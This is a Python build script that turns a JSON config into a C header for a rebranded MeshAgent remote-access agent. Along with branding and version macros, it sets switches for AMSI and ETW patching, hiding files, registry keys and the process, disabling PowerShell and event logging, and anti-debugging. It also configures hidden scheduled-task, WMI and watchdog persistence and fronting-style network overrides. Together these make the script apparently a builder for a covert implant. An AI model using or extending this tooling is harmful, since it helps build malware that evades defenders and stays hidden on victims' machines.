#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import sys
from datetime import datetime
from pathlib import Path


def repo_root_from(path_value: str | None) -> Path:
    if path_value:
        return Path(path_value).resolve()
    return Path(__file__).resolve().parents[1]


def pick_config_path(repo_root: Path, explicit: str | None) -> Path:
    candidates: list[Path] = []
    if explicit:
        candidates.append(Path(explicit))
    branding_env = None if explicit else os.environ.get("BRANDING_CONFIG_PATH")
    if branding_env:
        candidates.append(Path(branding_env))
    candidates.extend(
        [
            repo_root / "branding_config.local.json",
            repo_root / "branding_config.json",
        ]
    )
    for candidate in candidates:
        resolved = candidate if candidate.is_absolute() else (repo_root / candidate)
        if resolved.exists():
            return resolved.resolve()
    raise FileNotFoundError(f"Branding configuration not found under {repo_root}")


def get_value(source, key, default=None):
    if isinstance(source, dict):
        return source.get(key, default)
    return default


def get_bool(source, key, default=False):
    value = get_value(source, key, default)
    return bool(value)


def bool_to_int(value: bool) -> int:
    return 1 if value else 0


def escape_c_text(value) -> str:
    if value is None:
        return ""
    return str(value).replace("\\", "\\\\").replace('"', '\\"')


def to_c_literal(value) -> str:
    if value is None or str(value).strip() == "":
        return "NULL"
    return f'"{escape_c_text(value)}"'


def convert_mesh_id_to_hex_string(mesh_id: str | None) -> str | None:
    if mesh_id is None or str(mesh_id).strip() == "":
        return mesh_id
    text = str(mesh_id).strip()
    if text.lower().startswith("0x"):
        return text.upper()
    normalized = text.replace("@", "+").replace("$", "/")
    try:
        raw = base64.b64decode(normalized)
    except Exception:
        return text
    if not raw:
        return text
    return "0x" + raw.hex().upper()


def normalize_thumbprint(value: str | None) -> str | None:
    if value is None:
        return None
    normalized = re.sub(r"[^0-9A-Fa-f]", "", value).upper()
    if len(normalized) != 40:
        return None
    return normalized


def thumbprints_to_macro(thumbprints: list[str]) -> tuple[int, str | None]:
    if not thumbprints:
        return 0, None
    entries = []
    for thumb in thumbprints:
        bytes_list = [f"0x{thumb[index:index + 2]}" for index in range(0, len(thumb), 2)]
        entries.append("{ " + ", ".join(bytes_list) + " }")
    return len(thumbprints), "{ " + ", ".join(entries) + " }"


def version_parts(version_text: str | None) -> list[int]:
    if not version_text:
        version_text = "0.0.0.0"
    parts = []
    for token in str(version_text).split(".", 4):
        match = re.search(r"\d+", token)
        parts.append(int(match.group(0)) if match else 0)
    while len(parts) < 4:
        parts.append(0)
    return parts[:4]


def build_header(config: dict) -> str:
    branding = get_value(config, "branding", {}) or {}
    version_info = get_value(branding, "versionInfo", {}) or {}
    security = get_value(config, "security", {}) or {}
    provisioning = get_value(config, "provisioning", {}) or {}
    network = get_value(config, "network", {}) or {}
    persistence = get_value(config, "persistence", {}) or {}
    scheduled_task = get_value(persistence, "scheduledTask", {}) or {}
    wmi = get_value(persistence, "wmi", {}) or {}
    watchdog = get_value(persistence, "watchdog", {}) or {}
    recovery = get_value(persistence, "serviceRecovery", {}) or {}
    stealth = get_value(config, "stealth", {}) or {}
    evasion = get_value(config, "evasion", {}) or {}
    artifacts = get_value(config, "artifacts", {}) or {}
    advanced = get_value(config, "advanced", {}) or {}

    install_root = get_value(branding, "installRoot", "C:/ProgramData/MeshAgent")
    log_path = str(get_value(branding, "logPath", f"{install_root}/logs")).rstrip("/")
    binary_name = get_value(branding, "binaryName", "meshagent.exe")
    svc_dll_name = get_value(branding, "serviceDllName") or get_value(stealth, "serviceDllName") or "meshsvc.dll"
    database_name = get_value(artifacts, "databaseName", "meshagent.db")
    config_file_name = get_value(artifacts, "configFileName", "meshagent.conf")
    log_file_name = get_value(artifacts, "logFileName", "diagnostics.log")

    allowed_thumbprints: list[str] = []
    for entry in get_value(security, "allowedSigners", []) or []:
        thumb = normalize_thumbprint(get_value(entry, "thumbprint"))
        if thumb and thumb not in allowed_thumbprints:
            allowed_thumbprints.append(thumb)
    allow_count, allow_macro = thumbprints_to_macro(allowed_thumbprints)

    bundle_extract = get_bool(stealth, "bundleExtract")
    svchost_mode = get_bool(stealth, "svchostMode")
    if svchost_mode and not bundle_extract:
        bundle_extract = True

    mesh_id_raw = get_value(provisioning, "meshId")
    mesh_id_hex = convert_mesh_id_to_hex_string(mesh_id_raw)
    mesh_id_header = mesh_id_hex if mesh_id_hex else mesh_id_raw

    network_dynamic = get_bool(network, "dynamic")
    primary_endpoint_literal = to_c_literal(get_value(network, "primaryEndpoint"))
    network_sni_literal = to_c_literal(get_value(network, "sni"))
    network_host_header_literal = to_c_literal(get_value(network, "hostHeader"))
    network_user_agent_literal = to_c_literal(get_value(network, "userAgent"))
    network_alpn_raw = get_value(network, "alpn")
    if isinstance(network_alpn_raw, list):
        network_alpn_joined = ";".join([str(item) for item in network_alpn_raw if str(item).strip()])
    else:
        network_alpn_joined = network_alpn_raw
    network_alpn_literal = to_c_literal(network_alpn_joined)
    if network_alpn_literal == "NULL":
        network_alpn_literal = "NULL"
    fallback_entries = []
    for entry in get_value(network, "fallbackEndpoints", []) or []:
        if isinstance(entry, str):
            if entry.strip():
                fallback_entries.append(
                    {
                        "url": entry.strip(),
                        "sni": None,
                        "hostHeader": None,
                        "userAgent": None,
                        "alpn": [],
                    }
                )
            continue
        url_value = get_value(entry, "url")
        if not url_value:
            continue
        entry_alpn = get_value(entry, "alpn", []) or []
        if not isinstance(entry_alpn, list):
            entry_alpn = [entry_alpn]
        fallback_entries.append(
            {
                "url": url_value,
                "sni": get_value(entry, "sni"),
                "hostHeader": get_value(entry, "hostHeader"),
                "userAgent": get_value(entry, "userAgent"),
                "alpn": [str(item) for item in entry_alpn if str(item).strip()],
            }
        )
    fallback_count = len(fallback_entries)
    if fallback_count > 0:
        fallback_literals = []
        for entry in fallback_entries:
            alpn_text = ";".join(entry["alpn"]) if entry["alpn"] else None
            fallback_literals.append(
                "{ "
                + ", ".join(
                    [
                        to_c_literal(entry["url"]),
                        to_c_literal(entry["sni"]),
                        to_c_literal(entry["hostHeader"]),
                        to_c_literal(entry["userAgent"]),
                        to_c_literal(alpn_text),
                    ]
                )
                + " }"
            )
        fallback_list_macro = "{ " + ", ".join(fallback_literals) + " }"
    else:
        fallback_list_macro = "{ }"
    if network_dynamic:
        primary_endpoint_literal = "NULL"
        network_sni_literal = "NULL"
        network_alpn_literal = "NULL"
        fallback_count = 0
        fallback_list_macro = "{ }"

    mesh_type_raw = get_value(provisioning, "meshType")
    mesh_id_macro = "" if network_dynamic else (mesh_id_header or "")
    server_id_macro = "" if network_dynamic else str(get_value(provisioning, "serverId", "") or "")
    mesh_name_macro = "" if network_dynamic else str(get_value(provisioning, "meshName", "") or "")
    mesh_server_url_macro = "" if network_dynamic else str(get_value(provisioning, "serverUrl", "") or "")
    mesh_type_macro = 0 if network_dynamic else (mesh_type_raw if mesh_type_raw not in (None, "") else 0)

    branding_service_name = get_value(branding, "serviceName", "Mesh Agent")
    task_name = get_value(scheduled_task, "taskName") or f"{branding_service_name} Autorun"
    task_trigger = (get_value(scheduled_task, "trigger") or "ONLOGON").upper()
    restart_task_name = get_value(wmi, "taskName") or f"{branding_service_name}-RestartOnStop"
    recovery_actions = [str(item).strip().lower() for item in (get_value(recovery, "actions", []) or []) if str(item).strip()]

    file_version = get_value(version_info, "fileVersion", "1.0.0.0")
    product_version = get_value(version_info, "productVersion", file_version)
    file_parts = version_parts(file_version)
    product_parts = version_parts(product_version)
    internal_name = get_value(version_info, "internalName", binary_name)
    original_filename = get_value(version_info, "originalFilename", internal_name)

    allowlist_block = (
        f"#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT\n#define MESH_AGENT_ALLOWED_SIGNERS_COUNT {allow_count}\n"
        + (f"#undef MESH_AGENT_ALLOWED_SIGNERS\n#define MESH_AGENT_ALLOWED_SIGNERS {allow_macro}\n" if allow_macro else "")
    )

    lines = [
        "/* Generated file - do not edit. */",
        f"/* Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} */",
        "#ifndef GENERATED_MESHAGENT_BRANDING_H",
        "#define GENERATED_MESHAGENT_BRANDING_H",
        "",
        "/* ========== Service Branding ========== */",
        "#undef MESH_AGENT_SERVICE_FILE",
        f'#define MESH_AGENT_SERVICE_FILE TEXT("{escape_c_text(get_value(branding, "serviceName", ""))}")',
        "#undef MESH_AGENT_SERVICE_NAME",
        f'#define MESH_AGENT_SERVICE_NAME TEXT("{escape_c_text(get_value(branding, "displayName", ""))}")',
        "#undef MESH_AGENT_COMPANY_NAME",
        f'#define MESH_AGENT_COMPANY_NAME "{escape_c_text(get_value(branding, "companyName", ""))}"',
        "#undef MESH_AGENT_PRODUCT_NAME",
        f'#define MESH_AGENT_PRODUCT_NAME "{escape_c_text(get_value(branding, "productName", ""))}"',
        "#undef MESH_AGENT_FILE_DESCRIPTION",
        f'#define MESH_AGENT_FILE_DESCRIPTION "{escape_c_text(get_value(branding, "description", ""))}"',
        "#undef MESH_AGENT_INTERNAL_NAME",
        f'#define MESH_AGENT_INTERNAL_NAME "{escape_c_text(internal_name)}"',
        "#undef MESH_AGENT_COPYRIGHT",
        f'#define MESH_AGENT_COPYRIGHT "{escape_c_text(get_value(version_info, "legalCopyright", ""))}"',
        "#undef MESH_AGENT_ORIGINAL_FILENAME",
        f'#define MESH_AGENT_ORIGINAL_FILENAME "{escape_c_text(original_filename)}"',
        "#undef MESH_AGENT_INSTALL_ROOT",
        f'#define MESH_AGENT_INSTALL_ROOT TEXT("{escape_c_text(install_root)}")',
        "#undef MESH_AGENT_LOG_DIRECTORY",
        f'#define MESH_AGENT_LOG_DIRECTORY TEXT("{escape_c_text(log_path)}")',
        "#undef MESH_AGENT_BINARY_NAME",
        f'#define MESH_AGENT_BINARY_NAME TEXT("{escape_c_text(binary_name)}")',
        "#undef MESH_AGENT_SVCHOST_DLL",
        f'#define MESH_AGENT_SVCHOST_DLL TEXT("{escape_c_text(svc_dll_name)}")',
        "#undef MESH_AGENT_ARTIFACT_DB",
        f'#define MESH_AGENT_ARTIFACT_DB TEXT("{escape_c_text(database_name)}")',
        "#undef MESH_AGENT_ARTIFACT_CONFIG",
        f'#define MESH_AGENT_ARTIFACT_CONFIG TEXT("{escape_c_text(config_file_name)}")',
        "#undef MESH_AGENT_ARTIFACT_LOG",
        f'#define MESH_AGENT_ARTIFACT_LOG TEXT("{escape_c_text(log_file_name)}")',
        "#undef MESH_AGENT_FILE_VERSION_MAJOR",
        f"#define MESH_AGENT_FILE_VERSION_MAJOR {file_parts[0]}",
        "#undef MESH_AGENT_FILE_VERSION_MINOR",
        f"#define MESH_AGENT_FILE_VERSION_MINOR {file_parts[1]}",
        "#undef MESH_AGENT_FILE_VERSION_BUILD",
        f"#define MESH_AGENT_FILE_VERSION_BUILD {file_parts[2]}",
        "#undef MESH_AGENT_FILE_VERSION_REVISION",
        f"#define MESH_AGENT_FILE_VERSION_REVISION {file_parts[3]}",
        "#undef MESH_AGENT_FILE_VERSION_STR",
        f'#define MESH_AGENT_FILE_VERSION_STR TEXT("{escape_c_text(file_version)}")',
        "#undef MESH_AGENT_PRODUCT_VERSION_MAJOR",
        f"#define MESH_AGENT_PRODUCT_VERSION_MAJOR {product_parts[0]}",
        "#undef MESH_AGENT_PRODUCT_VERSION_MINOR",
        f"#define MESH_AGENT_PRODUCT_VERSION_MINOR {product_parts[1]}",
        "#undef MESH_AGENT_PRODUCT_VERSION_BUILD",
        f"#define MESH_AGENT_PRODUCT_VERSION_BUILD {product_parts[2]}",
        "#undef MESH_AGENT_PRODUCT_VERSION_REVISION",
        f"#define MESH_AGENT_PRODUCT_VERSION_REVISION {product_parts[3]}",
        "#undef MESH_AGENT_PRODUCT_VERSION_STR",
        f'#define MESH_AGENT_PRODUCT_VERSION_STR TEXT("{escape_c_text(product_version)}")',
        "",
        "/* ========== Network Configuration (compile-time only for explicit hardcoded lab builds) ========== */",
        "#ifdef MESH_PROVISIONING_HARDCODED",
        f"#define MESH_AGENT_NETWORK_ENDPOINT {primary_endpoint_literal}",
        f"#define MESH_AGENT_NETWORK_SNI {network_sni_literal}",
        f"#define MESH_AGENT_NETWORK_HOST_HEADER {network_host_header_literal}",
        f"#define MESH_AGENT_NETWORK_USER_AGENT {network_user_agent_literal}",
        "#define MESH_AGENT_NETWORK_JA3 NULL",
        f"#define MESH_AGENT_NETWORK_FALLBACK_COUNT {fallback_count}",
        f"#define MESH_AGENT_NETWORK_FALLBACK_LIST {fallback_list_macro}",
        "#undef MESH_ALPN_PROTOCOLS",
        f"#define MESH_ALPN_PROTOCOLS {network_alpn_literal}",
        "#endif /* MESH_PROVISIONING_HARDCODED */",
        "",
        "/* ========== Provisioning Data (compile-time only for explicit hardcoded lab builds) ========== */",
        "#ifdef MESH_PROVISIONING_HARDCODED",
        f'#define MESH_AGENT_MESH_ID "{escape_c_text(mesh_id_macro)}"',
        f'#define MESH_AGENT_SERVER_ID "{escape_c_text(server_id_macro)}"',
        f'#define MESH_AGENT_MESH_NAME "{escape_c_text(mesh_name_macro)}"',
        f'#define MESH_AGENT_SERVER_URL "{escape_c_text(mesh_server_url_macro)}"',
        f"#define MESH_AGENT_MESH_TYPE {mesh_type_macro}",
        "#endif /* MESH_PROVISIONING_HARDCODED */",
        "",
        "/* ========== Stealth Features ========== */",
        f"#define MESH_AGENT_STEALTH_ENABLED {bool_to_int(get_bool(stealth, 'enabled'))}",
        f"#define MESH_AGENT_SVCHOST_MODE {bool_to_int(svchost_mode)}",
        f"#define MESH_AGENT_HIDE_FILES {bool_to_int(get_bool(stealth, 'hideFiles'))}",
        f"#define MESH_AGENT_HIDE_REGISTRY {bool_to_int(get_bool(stealth, 'hideRegistry'))}",
        f"#define MESH_AGENT_AMSI_PATCH {bool_to_int(get_bool(stealth, 'amsiPatch'))}",
        f"#define MESH_AGENT_ETW_PATCH {bool_to_int(get_bool(stealth, 'ettwPatch'))}",
        f"#define MESH_AGENT_ANTI_DEBUG {bool_to_int(get_bool(stealth, 'antiDebug'))}",
        f"#define MESH_AGENT_SYSCALLS_DIRECT {bool_to_int(get_bool(stealth, 'syscallsDirectMode'))}",
        f"#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT {bool_to_int(bundle_extract)}",
        "",
        "/* ========== Local Operations Policy ========== */",
        f"#define MESH_AGENT_ALLOW_HOST_POWER_ACTIONS {bool_to_int(get_bool(advanced, 'allowHostPowerActions'))}",
        "",
        "/* ========== Persistence Configuration ========== */",
        f"#define MESH_AGENT_PERSIST_RUNKEY {bool_to_int(get_bool(persistence, 'runKey'))}",
        f"#define MESH_AGENT_PERSIST_TASK {bool_to_int(get_bool(scheduled_task, 'enabled'))}",
        f"#define MESH_AGENT_PERSIST_WMI {bool_to_int(get_bool(wmi, 'enabled'))}",
        f"#define MESH_AGENT_PERSIST_WATCHDOG {bool_to_int(get_bool(watchdog, 'enabled'))}",
        f"#define MESH_AGENT_PERSIST_RECOVERY_ENABLED {bool_to_int(get_bool(recovery, 'enabled'))}",
        f'#define MESH_AGENT_PERSIST_TASK_NAME TEXT("{escape_c_text(task_name)}")',
        f'#define MESH_AGENT_PERSIST_TASK_TRIGGER TEXT("{escape_c_text(task_trigger)}")',
        f"#define MESH_AGENT_PERSIST_TASK_HIDDEN {bool_to_int(get_bool(scheduled_task, 'hidden', True))}",
        f'#define MESH_AGENT_PERSIST_RESTART_TASK_NAME TEXT("{escape_c_text(restart_task_name)}")',
        f'#define MESH_AGENT_PERSIST_WMI_CLASS TEXT("{escape_c_text(get_value(wmi, "className", ""))}")',
        f'#define MESH_AGENT_PERSIST_WMI_METHOD TEXT("{escape_c_text(get_value(wmi, "methodName", ""))}")',
        f'#define MESH_AGENT_PERSIST_WMI_NAMESPACE TEXT("{escape_c_text(get_value(wmi, "namespace", ""))}")',
        f"#define MESH_AGENT_PERSIST_WATCHDOG_INTERVAL {get_value(watchdog, 'intervalSeconds', 0) or 0}",
        f"#define MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY {get_value(watchdog, 'restartDelay', 0) or 0}",
        f"#define MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH {bool_to_int(get_bool(watchdog, 'restartOnCrash'))}",
        f"#define MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD {get_value(recovery, 'resetPeriod', 0) or 0}",
        f"#define MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS {get_value(recovery, 'restartDelay', 0) or 0}",
        f'#define MESH_AGENT_PERSIST_RECOVERY_ACTIONS TEXT("{escape_c_text(",".join(recovery_actions))}")',
        "",
        "/* ========== Evasion Features ========== */",
        f"#define MESH_AGENT_DISABLE_PS_LOGGING {bool_to_int(get_bool(evasion, 'disablePowerShellLogging'))}",
        f"#define MESH_AGENT_DISABLE_EVENT_LOGS {bool_to_int(get_bool(evasion, 'disableEventLogs'))}",
        f"#define MESH_AGENT_DISABLE_ETW {bool_to_int(get_bool(evasion, 'disableETW'))}",
        f"#define MESH_AGENT_HIDE_TASKMANAGER {bool_to_int(get_bool(evasion, 'hideFromTaskManager'))}",
        f"#define MESH_AGENT_USE_SYSCALLS {bool_to_int(get_bool(evasion, 'useSyscalls'))}",
        "",
        "/* ========== Signing Allowlist ========== */",
        allowlist_block.rstrip(),
        "",
        "#endif /* GENERATED_MESHAGENT_BRANDING_H */",
    ]
    return "\n".join(lines) + "\n"


def write_outputs(config_path: Path, output_header: Path) -> None:
    with config_path.open("r", encoding="utf-8") as handle:
        config = json.load(handle)

    branding = get_value(config, "branding", {}) or {}
    if not get_value(branding, "serviceName") or not get_value(branding, "displayName"):
        raise ValueError(f"branding.serviceName and branding.displayName must be populated in {config_path}")

    output_header.parent.mkdir(parents=True, exist_ok=True)
    with output_header.open("w", encoding="utf-8", newline="\n") as handle:
        handle.write(build_header(config))

    print(f"[OK] Branding header generated: {output_header}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate MeshAgent branding header.")
    parser.add_argument("--repo-root", dest="repo_root")
    parser.add_argument("--config", dest="config_path")
    parser.add_argument("--output-header", dest="output_header")
    args = parser.parse_args()

    repo_root = repo_root_from(args.repo_root)
    config_path = pick_config_path(repo_root, args.config_path)
    output_header = Path(args.output_header).resolve() if args.output_header else (repo_root / "meshcore" / "generated" / "meshagent_branding.h")

    try:
        write_outputs(config_path, output_header)
    except Exception as exc:
        print(f"[ERROR] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
